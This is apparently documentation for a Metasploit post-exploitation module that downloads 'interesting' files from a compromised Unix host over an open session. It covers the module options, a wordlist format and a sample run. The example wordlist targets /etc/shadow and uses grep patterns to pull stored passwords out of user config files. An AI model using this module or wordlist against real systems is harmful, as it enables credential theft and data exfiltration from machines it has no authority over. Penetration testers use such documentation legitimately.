Downloading files

## Module Options

**DOWNLOAD**

Download a special file or directory

**FILES**

Download files defined in this wordlist

**SESSION**

Which session to use, which can be viewed with `sessions -l`

**TIMEOUT**

Default timeout is set to 5 minutes. You can change it (large files usually
nee a while to be downloaded)

**USE_UPDATEDB**

Use UpdateDB for searching for files. Creating this DB needs some time
(running find over /). Searching many files (also for other Staekka modules)it can speed up things.

## Wordlist
### supported entries
Format:
path||description text|type


### Example of wordlist
```
/etc/passwd||default unix passwd|:text
/etc/shadow||password hashes|:text
/etc/nofile||no_file|:text
/etc/issue||test file|:data
# home directory
#~/.bashrc||shell config|:text
etc/fstab||unix config|:text  # etc/fstab
/etc/pam.d/||pam config|:text
/home/user/.config/Last.fm/Last.fm.conf||GREP(/\\Password\s*=(.*)/)|:text
/home/user/.cvechecker.rc||CONFGREP(/dbpass\s*=\s*"(.*)"/)|:text
```

## Scenario
```
msf post(download_interessting) > options

Module options (post/unix/gather/download_interessting):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DOWNLOAD                       no        Files and/or directories to download
   FILES                          no        Wordist of files to download /home/user/staekka/data/wordlists/interessting_files.txt
   SESSION       1                yes       The session to run this module on.
   TIMEOUT       300              no        Timeout should be higher on large directories
   USE_UPDATEDB  true             no        Use an updatedb database and search for filenames instead of full path

msf post(download_interessting) > set FILES /home/jot/Code/metasploit/staekka/data/wordlists/interessting_files.txt
FILES => /home/user/staekka-test/data/wordlists/interessting_files.txt
msf post(download_interessting) > run

[*] downloaded /etc/passwd : default unix passwd
[*] downloaded /etc/issue : test file
[*] downloaded /etc/fstab : unix config
[*] downloaded /chroot/debian/etc/fstab : unix config
[*] downloaded /etc/pam.d/ : pam config
[*] Post module execution completed
```


